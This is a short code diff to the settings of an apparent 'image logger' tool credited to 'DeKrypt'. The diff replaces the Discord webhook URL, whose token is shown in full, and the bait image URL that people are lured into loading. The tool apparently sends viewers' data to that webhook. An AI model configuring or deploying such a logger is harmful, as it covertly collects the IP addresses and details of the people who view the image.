@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1521100634726863069/rBGdoW4Ffx-J8WTZNB4ZlCCCJiMTx-m5CQ7LL7oGWFqSIDXKPpCKIAuQ0rgSqJxL075X",
-    "image": "https://c8.alamy.com/comp/2R8M0H3/black-color-round-seal-sticker-in-word-apology-on-white-background-2R8M0H3.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1521101803725258783/X1pj1AvFXhe8e_555_bIE6hLwS_DZ6dxiFl0eYTmfWUp9-yKyCIfG5-u_peKbOYsQINL",
+    "image": "https://e7.pngegg.com/pngimages/175/463/png-clipart-internet-meme-know-your-meme-information-meme-microphone-head.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
